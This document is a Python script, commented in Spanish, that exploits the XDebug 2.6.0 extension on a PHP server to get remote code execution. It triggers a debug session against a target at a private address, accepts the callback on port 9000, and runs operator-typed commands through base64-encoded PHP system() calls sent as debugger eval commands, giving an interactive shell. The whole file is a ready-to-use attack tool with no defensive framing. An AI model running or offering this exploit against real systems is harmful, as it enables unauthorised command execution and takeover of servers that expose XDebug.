#!/usr/bin/python3

import requests
import socket 
import base64
import signal
import re

# Clases
class Color:
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WHITE = '\033[1;37m'
    RED = '\033[91m'
    END = '\033[0m'

# Functions
def exit2calle(sig, frame):  # Controlamos salida forzada con Ctrl^C
    print(Color.YELLOW + "\nOki, nos vamos..." + Color.END)
    exit(0)

signal.signal(signal.SIGINT, exit2calle)

def main():
    print(Color.CYAN + "\nFakeShell (RCE) explotando extensión XDebug 2.6.0 en PHP\n" + Color.END)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('0.0.0.0', 9000)
    sock.bind(server_address)
    sock.listen(10)

    try:
        r = requests.get("http://172.20.0.10/info.php?XDEBUG_SESSION_START=phpstorm", timeout=3)
    except requests.exceptions.Timeout:
        pass

    conn, addr = sock.accept()

    while True: 
        client_data = conn.recv(1024) 

        try:
            b64_result = re.findall(r"<!\[CDATA\[(.*?)\]\]>", str(client_data))[0]
            if b64_result != "Xdebug":
                try:  # Evitamos que explote al dar enter sin ningun comando a ejecutar
                    result = base64.b64decode(bytes(b64_result, 'ascii')).decode('utf-8')
                    print(result)
                except:
                    pass
        except IndexError:
            pass

        command = input(Color.WHITE + "xdeBUG ~> " + Color.END)
        complete_command = f'system("{command}");'
        b64_command = base64.b64encode(bytes(complete_command, 'utf-8')).decode('ascii')
        to_send = f"eval -i 1 -- {b64_command}\x00"

        conn.sendall(to_send.encode())

if __name__ == '__main__':
    main()
